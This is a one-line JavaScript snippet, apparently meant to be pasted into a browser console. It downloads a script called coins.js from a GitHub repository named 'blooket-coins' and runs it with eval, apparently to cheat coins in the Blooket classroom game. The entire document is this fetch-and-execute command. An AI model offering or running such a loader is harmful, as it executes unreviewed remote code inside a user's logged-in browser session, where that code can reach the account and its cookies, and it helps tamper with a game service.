fetch("https://raw.githubusercontent.com/BouncyBird/blooket-coins/main/coins.js").then((res) => res.text().then((t) => eval(t)))
